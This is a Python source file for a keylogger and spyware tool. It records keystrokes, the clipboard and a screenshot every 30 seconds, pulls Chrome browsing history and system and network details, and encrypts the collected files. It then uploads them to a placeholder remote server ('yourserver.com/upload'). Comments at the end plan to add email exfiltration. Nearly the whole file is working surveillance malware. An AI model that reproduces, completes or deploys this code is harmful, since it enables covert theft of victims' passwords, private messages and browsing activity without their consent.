import socket
import time
import os
import platform
import subprocess
import psutil
import threading
import clipboard
import pyautogui
import sqlite3
from pynput import keyboard
import datetime
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import requests
import base64
import hashlib
import shutil
import tarfile

# Load or generate RSA keys
def generate_keys():
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()
    return private_key, public_key

def load_public_key(pem_data):
    return serialization.load_pem_public_key(pem_data, backend=default_backend())

def encrypt_data(data, public_key):
    return public_key.encrypt(
        data,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

def decrypt_data(encrypted_data, private_key):
    return private_key.decrypt(
        encrypted_data,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

def symmetric_encrypt(data, key):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return iv + encryptor.update(data) + encryptor.finalize()

def symmetric_decrypt(encrypted_data, key):
    iv = encrypted_data[:16]
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(encrypted_data[16:]) + decryptor.finalize()

def send_file(file_path, url):
    with open(file_path, 'rb') as f:
        files = {'file': f}
        response = requests.post(url, files=files)
        print(f"Sent {file_path}, response: {response.status_code}")

# Save keys to files or load existing keys
private_key, public_key = generate_keys()
public_key_pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

# Symmetric key for local encryption
symmetric_key = hashlib.sha256(b"this_is_a_secret_key").digest()

# Function to copy clipboard data to a file
def copy_clipboard():
    file_path = "clipboard.txt"
    try:
        pasted_data = clipboard.paste()
        with open(file_path, "a") as f:
            f.write(f"Clipboard Data ({datetime.datetime.now()}): \n" + pasted_data + "\n")
    except Exception as e:
        with open(file_path, "a") as f:
            f.write(f"Clipboard could not be copied. Exception: {e}\n")

# Function to refresh clipboard data every 2 seconds
def refresh_clipboard():
    previous_data = ""
    while True:
        time.sleep(2)
        try:
            current_data = clipboard.paste()
            if current_data != previous_data:
                with open("clipboard.txt", "a") as f:
                    f.write(f"Clipboard Data ({datetime.datetime.now()}): \n" + current_data + "\n")
                previous_data = current_data
        except Exception as e:
            with open("clipboard.txt", "a") as f:
                f.write(f"Clipboard could not be copied. Exception: {e}\n")

# Function to gather system information and write to file
def gather_system_information():
    with open("system_info.txt", "w") as f:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)

        # Write system information
        f.write(f"System Information:\n")
        f.write(f"Hostname: {hostname}\n")
        f.write(f"IP Address: {ip_address}\n")
        f.write(f"Processor: {platform.processor()}\n")
        f.write(f"System: {platform.system()} {platform.version()}\n")
        f.write(f"Machine: {platform.machine()}\n")
        f.write(f"Release: {platform.release()}\n")
        f.write(f"Architecture: {platform.architecture()[0]}\n")
        f.write(f"Python Version: {platform.python_version()}\n")
        f.write(f"Platform: {platform.platform()}\n")
        f.write(f"Uname: {str(platform.uname())}\n")
        f.write(f"Boot Time: {datetime.datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"CPU Count: {psutil.cpu_count()}\n")
        f.write(f"CPU Frequency: {psutil.cpu_freq().current}\n")
        f.write(f"CPU Usage: {psutil.cpu_percent(interval=1)}%\n")
        f.write(f"Memory Usage: {psutil.virtual_memory().percent}%\n")
        f.write(f"Disk Usage: {psutil.disk_usage('/').percent}%\n")
        f.write(f"Battery: {psutil.sensors_battery()}\n")
        f.write(f"Users: {psutil.users()}\n")

# Function to gather connected devices and write to file
def gather_connected_devices():
    with open("connected_devices.txt", "w") as f:
        devices = subprocess.check_output('arp -a', shell=True).decode('utf-8').split('\n')
        f.write("Connected Devices:\n")
        for device in devices:
            f.write(device + "\n")

# Function to gather network information and write to file
def gather_network_information():
    with open("network_info.txt", "w") as f:
        network_info = subprocess.check_output('ipconfig', shell=True).decode('utf-8')
        f.write("Network Information:\n")
        f.write(network_info)

# Function to gather browser history and write to file
def gather_browser_history():
    data_path = os.path.expanduser('~') + r"\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
    history_db = os.path.join(data_path, 'history')

    try:
        conn = sqlite3.connect(history_db)
        cursor = conn.cursor()
        cursor.execute("SELECT urls.url, urls.visit_count, visits.visit_time FROM urls, visits WHERE urls.id = visits.url ORDER BY visits.visit_time DESC;")

        results = cursor.fetchall()

        with open("browser_history.txt", "w") as f:
            f.write("Browser History:\n")
            for url, count, visit_time in results:
                visit_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=visit_time)
                visit_time_str = visit_time.strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"URL: {url}\nVisit Count: {count}\nVisit Time: {visit_time_str}\n\n")

        cursor.close()
        conn.close()
    except sqlite3.OperationalError as e:
        print(f"Error accessing browser history database: {e}")

# Function to capture a screenshot
def capture_screenshot():
    while True:
        screenshot = pyautogui.screenshot()
        folder_path = "screenshots"
        os.makedirs(folder_path, exist_ok=True)
        screenshot.save(os.path.join(folder_path, f"screenshot_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.png"))
        time.sleep(30)  # Capture a screenshot every 30 seconds

# Function to write keylogger data to a file
def write_file(key):
    with open("keylogger.txt", "a") as f:
        f.write(f"{key} ")

# Function to write only letters to another keylogger file
def write_letters_file(key):
    with open("keylogger_letters.txt", "a") as f:
        f.write(f"{key}")

# Keylogger event handlers
keys = set()
stop_keylogger = False

def on_press(key):
    global keys, stop_keylogger
    keys.add(key)

    try:
        if hasattr(key, 'char') and key.char is not None:
            write_file(key.char)
            write_letters_file(key.char)
        elif key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
            write_file("Ctrl")
        elif key == keyboard.Key.shift:
            write_file("Shift")
        elif key == keyboard.Key.enter:
            write_file("Enter\n")
        elif key == keyboard.Key.backspace:
            write_file("Backspace")
        elif key == keyboard.Key.tab:
            write_file("Tab")
        elif key == keyboard.Key.space:
            write_file("Space")
            write_letters_file(" ")
        elif key in [keyboard.Key.alt_l, keyboard.Key.alt_r]:
            write_file("Alt")
        elif key == keyboard.Key.caps_lock:
            write_file("CapsLock")
        elif key == keyboard.Key.num_lock:
            write_file("NumLock")
        elif key == keyboard.Key.up:
            write_file("UpArrow")
        elif key == keyboard.Key.down:
            write_file("DownArrow")
        elif key == keyboard.Key.left:
            write_file("LeftArrow")
        elif key == keyboard.Key.right:
            write_file("RightArrow")
        elif key == keyboard.Key.delete:
            write_file("Delete")
        elif key == keyboard.Key.esc:
            write_file("Esc")
        elif key == keyboard.Key.esc and keyboard.Key.shift in keys:
            stop_keylogger = True
            return False
        elif key == keyboard.Key.numpad0 or key == keyboard.Key.numpad1 or key == keyboard.Key.numpad2 \
                or key == keyboard.Key.numpad3 or key == keyboard.Key.numpad4 or key == keyboard.Key.numpad5 \
                or key == keyboard.Key.numpad6 or key == keyboard.Key.numpad7 or key == keyboard.Key.numpad8 \
                or key == keyboard.Key.numpad9:
            write_file(f"Numpad{key - keyboard.Key.numpad0}")
        elif 'ctrl' in keys and 'esc' in keys:
            stop_keylogger = True
            return False
        elif 'ctrl' in keys and 'c' in keys:
            copy_clipboard()
        elif 'ctrl' in keys and 'x' in keys:
            copy_clipboard()
        else:
            write_file(f"SpecialKey({key})")
    except AttributeError:
        write_file(f"SpecialKey({key})")

def on_release(key):
    global keys
    if key in keys:
        keys.remove(key)

# Function to run clipboard copying every 2 seconds
def clipboard_thread():
    previous_data = ""
    while True:
        try:
            current_data = clipboard.paste()
            if current_data != previous_data:
                with open("clipboard.txt", "a") as f:
                    f.write(f"Clipboard Data ({datetime.datetime.now()}): \n" + current_data + "\n")
                previous_data = current_data
        except Exception as e:
            with open("clipboard.txt", "a") as f:
                f.write(f"Clipboard could not be copied. Exception: {e}\n")
        time.sleep(2)  # Check clipboard every 2 seconds

# Function to refresh clipboard data every 60 seconds
def refresh_clipboard_thread():
    while True:
        copy_clipboard()
        time.sleep(60)  # Refresh clipboard every 60 seconds

# Function to encrypt files locally after 2 minutes
def encrypt_files():
    files_to_encrypt = ["system_info.txt", "connected_devices.txt", "network_info.txt", "browser_history.txt", "keylogger.txt", "keylogger_letters.txt", "clipboard.txt"]
    for file in files_to_encrypt:
        try:
            with open(file, "rb") as f:
                data = f.read()
            encrypted_data = symmetric_encrypt(data, symmetric_key)
            with open(file + ".enc", "wb") as f:
                f.write(encrypted_data)
            os.remove(file)
        except FileNotFoundError:
            continue

def encrypt_screenshots_folder():
    folder_path = "screenshots"
    tar_file = "screenshots.tar.gz"
    
    with tarfile.open(tar_file, "w:gz") as tar:
        tar.add(folder_path, arcname=os.path.basename(folder_path))
    
    with open(tar_file, "rb") as f:
        data = f.read()
    
    encrypted_data = symmetric_encrypt(data, symmetric_key)
    
    with open(tar_file + ".enc", "wb") as f:
        f.write(encrypted_data)
    
    os.remove(tar_file)

def decrypt_files():
    files_to_decrypt = ["system_info.txt.enc", "connected_devices.txt.enc", "network_info.txt.enc", "browser_history.txt.enc", "keylogger.txt.enc", "keylogger_letters.txt.enc", "clipboard.txt.enc"]
    for file in files_to_decrypt:
        try:
            with open(file, "rb") as f:
                encrypted_data = f.read()
            data = symmetric_decrypt(encrypted_data, symmetric_key)
            with open(file[:-4], "wb") as f:
                f.write(data)
            os.remove(file)
        except FileNotFoundError:
            continue

def decrypt_screenshots_folder():
    tar_file = "screenshots.tar.gz.enc"
    
    with open(tar_file, "rb") as f:
        encrypted_data = f.read()
    
    data = symmetric_decrypt(encrypted_data, symmetric_key)
    
    with open("screenshots.tar.gz", "wb") as f:
        f.write(data)
    
    with tarfile.open("screenshots.tar.gz", "r:gz") as tar:
        tar.extractall()
    
    os.remove("screenshots.tar.gz")

# Function to send encrypted files to a remote server
def send_files_to_server():
    url = "http://yourserver.com/upload"  # Change this to your server URL
    files_to_send = ["system_info.txt.enc", "connected_devices.txt.enc", "network_info.txt.enc", "browser_history.txt.enc", "keylogger.txt.enc", "keylogger_letters.txt.enc", "clipboard.txt.enc", "screenshots.tar.gz.enc"]

    for file in files_to_send:
        send_file(file, url)

# Gather initial system and network information, browser history, and connected devices
gather_system_information()
gather_network_information()
gather_browser_history()
gather_connected_devices()

# Create and start clipboard thread
clipboard_thread = threading.Thread(target=clipboard_thread)
clipboard_thread.start()

# Create and start clipboard refresh thread
refresh_clipboard_thread = threading.Thread(target=refresh_clipboard_thread)
refresh_clipboard_thread.start()

# Create and start screenshot thread
screenshot_thread = threading.Thread(target=capture_screenshot)
screenshot_thread.start()

# Start keylogger with multi-threading for faster capture
keylogger_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
keylogger_listener.start()

# Encrypt files locally after 2 minutes
encryption_thread = threading.Thread(target=lambda: (time.sleep(120), encrypt_files(), encrypt_screenshots_folder()))
encryption_thread.start()

# Send files to server every 10 minutes
send_files_thread = threading.Thread(target=lambda: (time.sleep(600), send_files_to_server()))
send_files_thread.start()

# Keep the main thread running to allow the keylogger and other threads to operate
try:
    while not stop_keylogger:
        time.sleep(1)
finally:
    keylogger_listener.stop()
    print("Keylogger stopped.")


# Call the function to gather browser history
# The gather_browser_history function is trying to get the browser history by using the tasklist command. However, the tasklist command does not provide browser history. It only lists the currently running tasks or services in your system.
# If you want to gather browser history, you would need to access the SQLite databases that browsers like Chrome and Firefox use to store history data. This is a complex task and involves understanding the database schema used by each browser. Also, it's important to note that accessing browser history without user consent can be a violation of privacy.
# Here's a simplified example of how you might access Chrome's history (this will only work if Chrome is not currently running, as the database will be locked otherwise). This code opens the history SQLite database that Chrome uses to store browsing history, and writes each URL to a file. Note that this is a simplified example and may not work in all cases, especially if the user has multiple Chrome profiles or if the database schema changes in a future Chrome update


#Scope of improvements:
# 1. Add a feature to send the all contents to email
# 2. Combination of keystrokes with ctrl, alt is not handled properly 
# 3. Numeric numbers on numpad can be capruted properly



#Email part
 # if currentTime > stoppingTime:
    #     # Send keylogger contents to email
    #     send_email(keys_information, file_path + extend + keys_information)
    #     # Clear contens of keylogger log file.
    #     with open("keylogger.txt", "w") as f:
    #         f.write(" ")
    #     # Take a screenshot and send to email
    #     screenshot()
    #     send_email(screenshot_information, file_path + extend + screenshot_information)
    #     # Gather clipboard contents and send to email
    #     copy_clipboard()
    #     send_email(clipboard_information, file_path + extend + clipboard_information)

    #     # Increase iteration by 1
    #     number_of_iterations += 1
    #     # Update current time
    #     currentTime = time.time()
    #     stoppingTime = time.time() + time_iteration